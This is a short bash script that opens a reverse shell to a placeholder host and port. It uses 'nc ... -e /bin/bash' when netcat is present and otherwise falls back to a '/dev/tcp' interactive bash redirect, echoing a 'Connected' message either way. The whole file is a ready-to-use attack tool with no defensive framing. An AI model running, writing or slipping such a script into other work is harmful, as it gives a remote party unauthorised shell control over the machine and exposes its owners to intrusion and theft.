#!/bin/bash

# Will check if NetCat installation path exists. If it does, then NetCat will be used to establish connection.
# If not, then Reverse Bash will be used to establish connection.

if which nc >/dev/null &> /dev/null; then
    echo NetCat Connected.
    nc IP-HERE PORT-HERE -e /bin/bash &
else
    echo Reverse Bash Connected.
    bash -i >& /dev/tcp/IP-HERE/PORT-HERE 0>&1
fi
